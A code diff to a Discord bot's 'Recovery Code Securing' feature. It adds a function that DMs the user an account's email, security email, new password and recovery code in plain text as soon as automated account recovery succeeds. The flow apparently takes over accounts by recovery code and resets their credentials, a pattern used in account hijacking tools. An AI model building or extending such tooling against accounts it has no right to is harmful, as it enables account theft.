@@ -17,6 +17,26 @@ async def _send_failure_dm(user: discord.User | discord.Member, embed: discord.E
         return False
 
 
+async def _send_early_credentials(user: discord.User | discord.Member, creds: dict) -> None:
+    """DM credentials as soon as RecoverUser succeeds (before polish/secure)."""
+    embed = discord.Embed(
+        title="Credentials ready (securing continues…)",
+        description=(
+            "Recovery finished. Full securing is still running — "
+            "save these now in case the next step stalls."
+        ),
+        color=0x2765F5,
+    )
+    embed.add_field(name="Email", value=f"```{creds.get('email', '?')}```", inline=False)
+    embed.add_field(name="Security Email", value=f"```{creds.get('security_email', '?')}```", inline=True)
+    embed.add_field(name="Password", value=f"```{creds.get('password', '?')}```", inline=True)
+    embed.add_field(name="Recovery Code", value=f"```{creds.get('recovery_code', '?')}```", inline=False)
+    try:
+        await user.send(embed=embed)
+    except discord.Forbidden:
+        log.warning("Could not DM early credentials for %s", creds.get("email"))
+
+
 class recoveryCodeModal(ui.Modal):
     def __init__(self):
         super().__init__(title="Recovery Code Securing")
@@ -44,7 +64,8 @@ class recoveryCodeModal(ui.Modal):
                 method = "rcode",
                 data = {
                     "recovery_code": recovery_code
-                }
+                },
+                on_credentials=lambda creds: _send_early_credentials(interaction.user, creds),
             )
         except Exception as e:
             log.exception("recovery_secure crashed for %s", email)
@@ -93,5 +114,3 @@ class recoveryCodeModal(ui.Modal):
                 account["details"]
             )
         )
-
-    
